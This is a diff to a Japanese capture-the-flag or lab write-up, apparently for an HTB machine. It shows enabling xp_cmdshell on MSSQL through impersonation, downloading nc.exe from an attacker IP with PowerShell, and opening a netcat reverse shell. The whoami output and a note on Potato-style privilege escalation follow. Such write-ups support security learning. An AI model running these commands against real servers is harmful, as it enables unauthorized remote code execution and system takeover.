@@ -660,6 +660,108 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [!] Press help for extra shell commands
 SQL (sequel\Administrator  dbo@master)> 
 ```
+step3でも確認したが、xp_cmdshellは無効になっているもよう  
+しかしadministratorになりすまししているため、有効化が可能であった
+```sh
+SQL (sequel\Administrator  dbo@master)> xp_cmdshell whoami
+ERROR(DC\SQLMOCK): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+
+SQL (sequel\Administrator  dbo@master)> sp_configure 'show advanced options', 1
+INFO(DC\SQLMOCK): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+
+SQL (sequel\Administrator  dbo@master)> RECONFIGURE
+
+SQL (sequel\Administrator  dbo@master)> sp_configure 'xp_cmdshell', 1
+INFO(DC\SQLMOCK): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+
+SQL (sequel\Administrator  dbo@master)> RECONFIGURE
+
+SQL (sequel\Administrator  dbo@master)> xp_cmdshell whoami
+output           
+--------------   
+sequel\sql_svc   
+
+NULL 
+```
+xp_cmdshell経由で実行するnc.exeを配送する
+```sh
+└─$ cp /usr/share/windows-resources/binaries/nc.exe .                             
+
+└─$ impacket-smbserver share . -smb2support                                   
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+```
+xp_cmdshellでnc.exeを実行
+```sh
+SQL (sequel\Administrator  dbo@master)> xp_cmdshell "powershell /c Invoke-Webrequest http://10.10.16.28/nc.exe -outfile c:\users\sql_svc\documents\nc.exe"
+output   
+------   
+NULL
+
+SQL (sequel\Administrator  dbo@master)> xp_cmdshell "cmd /c c:\users\sql_svc\documents\nc.exe -e cmd 10.10.16.28 4444"
+^C
+```
+リバースシェル取得！  
+winrmとは異なって、`SeImpersonatePrivilege`権限が有効になっていることを確認  
+ということで、ポテト系の権限昇格も可能
+```sh
+└─$ rlwrap nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.28] from (UNKNOWN) [10.129.228.253] 52962
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name      SID                                           
+============== ==============================================
+sequel\sql_svc S-1-5-21-4078382237-1492182817-2568127209-1106
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                                             Attributes                                        
+========================================== ================ =============================================================== ==================================================
+Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                                    Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                                    Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
+NT SERVICE\MSSQL$SQLMOCK                   Well-known group S-1-5-80-3352489819-4000206481-1934998105-2023371924-4240525201 Enabled by default, Enabled group, Group owner    
+LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                                      
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+ERROR: Unable to get user claims information.
+```
 
 
 ## おまけ
